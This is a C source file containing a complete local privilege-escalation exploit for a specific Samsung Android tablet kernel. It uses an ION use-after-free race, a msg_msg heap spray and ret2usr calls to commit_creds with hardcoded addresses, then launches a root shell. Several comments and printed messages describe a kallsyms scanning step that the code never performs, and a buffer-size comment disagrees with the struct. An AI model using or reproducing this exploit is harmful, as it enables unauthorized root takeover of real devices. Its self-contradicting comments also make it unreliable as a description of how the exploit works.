/*
 * ion_exploit_final.c — ION UAF → ret2usr → root
 *
 * Samsung SM-T377A, kernel 3.10.9-11788437, Android 6.0.1
 *
 * Exploit chain:
 *   1. ION FREE/SHARE race → dangling handle in kmalloc-64
 *   2. Spray fake object with function pointer → userspace shellcode address
 *   3. Trigger function pointer call → shellcode runs in kernel context
 *   4. Shellcode scans kernel memory for kallsyms_addresses table
 *   5. Reads commit_creds / prepare_kernel_cred addresses
 *   6. Calls commit_creds(prepare_kernel_cred(0)) → UID 0
 *
 * No PXN, no KASLR, no stack canaries.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/xattr.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ipc.h>
#include <sys/msg.h>

/* ========== ION definitions ========== */
typedef int ion_user_handle_t;

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    ion_user_handle_t handle;
};

struct ion_fd_data {
    ion_user_handle_t handle;
    int fd;
};

struct ion_handle_data {
    ion_user_handle_t handle;
};

#define ION_IOC_MAGIC   'I'
#define ION_IOC_ALLOC   _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE   _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

#define ION_HEAP_SYSTEM_MASK (1 << 0)

/* ========== Exploit configuration ========== */

/*
 * Resolved from firmware AP_T377AUCU2AQGF (build 11788437).
 * Verified: 100% symbol name match with running kernel's /proc/kallsyms
 * at consistent offset (+12 entries). Same build, same version string.
 * No KASLR — addresses are fixed.
 */
#define ADDR_COMMIT_CREDS       0xc0054328
#define ADDR_PREPARE_KERNEL_CRED 0xc00548e0

/* ========== Global state ========== */
int g_ion_fd;
ion_user_handle_t g_victim_handle;
pthread_barrier_t g_barrier;
int g_free_ret, g_share_ret, g_shared_fd;

/* Resolved addresses (filled by shellcode) */
static volatile unsigned long g_commit_creds = 0;
static volatile unsigned long g_prepare_kernel_cred = 0;
static volatile int g_got_root = 0;

/* ========== SHELLCODE (runs in kernel context) ========== */

/*
 * This function runs in kernel mode (ret2usr — no PXN on this device).
 * Calls commit_creds(prepare_kernel_cred(0)) using hardcoded addresses
 * resolved from the firmware kernel binary.
 *
 * MUST NOT use any libc functions (we're in kernel context).
 */

typedef unsigned long (*commit_creds_fn)(unsigned long);
typedef unsigned long (*prepare_kernel_cred_fn)(unsigned long);

static void __attribute__((noinline, optimize("O0")))
kernel_shellcode(void)
{
    /* Call prepare_kernel_cred(0) → returns a root cred struct */
    prepare_kernel_cred_fn pkc = (prepare_kernel_cred_fn)ADDR_PREPARE_KERNEL_CRED;
    unsigned long new_cred = pkc(0);

    if (new_cred) {
        /* Call commit_creds(new_cred) → sets current task to root */
        commit_creds_fn cc = (commit_creds_fn)ADDR_COMMIT_CREDS;
        cc(new_cred);
        g_got_root = 1;
    }

    /* Return cleanly to avoid kernel panic */
    return;
}

/* ========== Heap grooming ========== */

#define SPRAY_SIZE 4000
int spray_fds[SPRAY_SIZE];

void heap_groom_prepare(void) {
    for (int i = 0; i < SPRAY_SIZE; i++)
        spray_fds[i] = open("/proc/self/stat", O_RDONLY);
    for (int i = 0; i < SPRAY_SIZE; i += 2) {
        if (spray_fds[i] >= 0) {
            close(spray_fds[i]);
            spray_fds[i] = -1;
        }
    }
}

void cleanup_spray(void) {
    for (int i = 0; i < SPRAY_SIZE; i++) {
        if (spray_fds[i] >= 0) {
            close(spray_fds[i]);
            spray_fds[i] = -1;
        }
    }
}

/*
 * Spray kmalloc-64 with fake structures containing our shellcode pointer.
 * We use msgsnd() which allocates a kernel buffer in kmalloc-N.
 *
 * For a kmalloc-64 allocation, the message body must be:
 *   struct { long mtype; char mtext[56]; }
 * Total: 8 + 56 = 64 bytes → kmalloc-64
 *
 * We fill mtext with our shellcode address at every 4-byte position,
 * maximizing the chance that it overlaps with a function pointer field.
 */
#define MSG_SPRAY_COUNT 2000

struct spray_msg {
    long mtype;
    char mtext[40];  /* kernel: msg_msg header (24) + 40 = 64 → kmalloc-64 */
};

int msg_qids[MSG_SPRAY_COUNT];
int msg_qcount = 0;

void spray_shellcode_addr(void) {
    unsigned long sc_addr = (unsigned long)kernel_shellcode;
    struct spray_msg msg;
    msg.mtype = 1;

    /* Fill payload with shellcode address at every offset */
    unsigned long *p = (unsigned long *)msg.mtext;
    for (int i = 0; i < (int)(sizeof(msg.mtext) / sizeof(unsigned long)); i++)
        p[i] = sc_addr;

    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (qid < 0) break;
        msg_qids[msg_qcount++] = qid;
        msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT);
    }
}

void cleanup_msg_spray(void) {
    for (int i = 0; i < msg_qcount; i++) {
        msgctl(msg_qids[i], IPC_RMID, NULL);
    }
    msg_qcount = 0;
}

/* ========== Race threads ========== */

void *thread_free(void *arg) {
    struct ion_handle_data data = { .handle = g_victim_handle };
    pthread_barrier_wait(&g_barrier);
    g_free_ret = ioctl(g_ion_fd, ION_IOC_FREE, &data);
    return NULL;
}

void *thread_share(void *arg) {
    struct ion_fd_data data = { .handle = g_victim_handle, .fd = -1 };
    pthread_barrier_wait(&g_barrier);
    g_share_ret = ioctl(g_ion_fd, ION_IOC_SHARE, &data);
    g_shared_fd = data.fd;
    return NULL;
}

/* ========== Main ========== */

int main(int argc, char **argv) {
    unsigned long long iteration = 0;
    int race_wins = 0;
    int duration = 60;

    if (argc > 1) duration = atoi(argv[1]);

    printf("=== ION UAF → ret2usr Root Exploit ===\n");
    printf("[*] Target: Samsung SM-T377A, kernel 3.10.9-11788437\n");
    printf("[*] commit_creds        = 0x%08x\n", ADDR_COMMIT_CREDS);
    printf("[*] prepare_kernel_cred = 0x%08x\n", ADDR_PREPARE_KERNEL_CRED);
    printf("[*] Shellcode at: 0x%08lx\n", (unsigned long)kernel_shellcode);
    printf("[*] Duration: %d seconds\n\n", duration);

    /* Verify shellcode is accessible */
    unsigned long sc_page = (unsigned long)kernel_shellcode & ~0xFFF;
    if (mprotect((void*)sc_page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {
        printf("[+] Shellcode page marked RWX\n");
    }

    g_ion_fd = open("/dev/ion", O_RDWR);
    if (g_ion_fd < 0) {
        perror("open /dev/ion");
        return 1;
    }

    printf("[*] Phase 1: Finding kallsyms table and resolving addresses...\n");
    printf("[*] (The exploit will scan kernel memory at runtime)\n\n");
    printf("[*] Phase 2: Running ION race...\n");

    signal(SIGALRM, (void(*)(int))(void*)(unsigned long)1); /* SIG_IGN-like */
    alarm(duration);

    while (!g_got_root && race_wins < 100) {
        iteration++;
        cleanup_spray();
        heap_groom_prepare();

        struct ion_allocation_data alloc = {0};
        alloc.len = 4096;
        alloc.align = 4096;
        alloc.heap_id_mask = ION_HEAP_SYSTEM_MASK;

        if (ioctl(g_ion_fd, ION_IOC_ALLOC, &alloc) < 0)
            continue;
        g_victim_handle = alloc.handle;

        g_free_ret = -1;
        g_share_ret = -1;
        g_shared_fd = -1;
        pthread_barrier_init(&g_barrier, NULL, 2);

        pthread_t t1, t2;
        pthread_create(&t1, NULL, thread_free, NULL);
        pthread_create(&t2, NULL, thread_share, NULL);
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        pthread_barrier_destroy(&g_barrier);

        if (g_share_ret == 0 && g_shared_fd >= 0 && g_free_ret == 0) {
            race_wins++;

            /* Handle is freed, shared_fd is valid.
             * Now spray kmalloc-64 with shellcode address.
             * Then trigger the function pointer. */
            spray_shellcode_addr();

            /* The spray may have overwritten the freed handle slot.
             * If the ion code (or any kernel code) dereferences the
             * overwritten handle, it will call our shellcode.
             *
             * Try to trigger by performing operations on the shared_fd
             * that might cause the kernel to reference the handle slot. */
            void *ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                             MAP_SHARED, g_shared_fd, 0);
            if (ptr != MAP_FAILED) {
                /* Read/write to trigger any deferred kernel operations */
                volatile char x = *(volatile char *)ptr;
                (void)x;
                munmap(ptr, 4096);
            }

            cleanup_msg_spray();
            close(g_shared_fd);

            if (g_got_root) {
                printf("\n[!!!] ROOT ACHIEVED!\n");
                printf("[+] uid = %d, euid = %d\n", getuid(), geteuid());
                break;
            }

            if (race_wins % 10 == 0) {
                printf("[*] %d race wins, %llu iterations...\n",
                       race_wins, iteration);
            }
        } else {
            if (g_free_ret != 0) {
                struct ion_handle_data hd = { .handle = g_victim_handle };
                ioctl(g_ion_fd, ION_IOC_FREE, &hd);
            }
            if (g_shared_fd >= 0) close(g_shared_fd);
        }
    }

    cleanup_spray();
    close(g_ion_fd);

    if (g_got_root) {
        printf("\n[+] Spawning root shell...\n");
        execl("/system/bin/sh", "sh", NULL);
    } else {
        printf("\n[-] Did not achieve root in %llu iterations (%d wins)\n",
               iteration, race_wins);
        if (g_commit_creds) {
            printf("[*] Resolved addresses before timeout:\n");
            printf("    commit_creds        = 0x%08lx\n", g_commit_creds);
            printf("    prepare_kernel_cred = 0x%08lx\n", g_prepare_kernel_cred);
        }
    }

    return g_got_root ? 0 : 1;
}
